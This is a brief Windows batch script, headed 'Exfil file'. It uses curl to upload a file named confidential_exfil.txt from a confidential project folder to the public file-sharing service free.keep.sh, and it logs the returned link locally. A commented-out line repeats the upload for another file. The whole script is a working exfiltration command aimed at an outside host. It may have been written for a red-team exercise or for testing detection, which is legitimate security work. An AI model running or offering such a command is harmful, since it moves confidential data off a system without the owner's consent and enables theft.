@echo off

::Exfil file
::curl --upload-file c:\temporary\output.txt https://free.keep.sh >> c:\temporary\output2.txt
curl --upload-file c:\project\confidential\confidential_exfil.txt https://free.keep.sh >> c:\temporary\output2.txt

EXIT
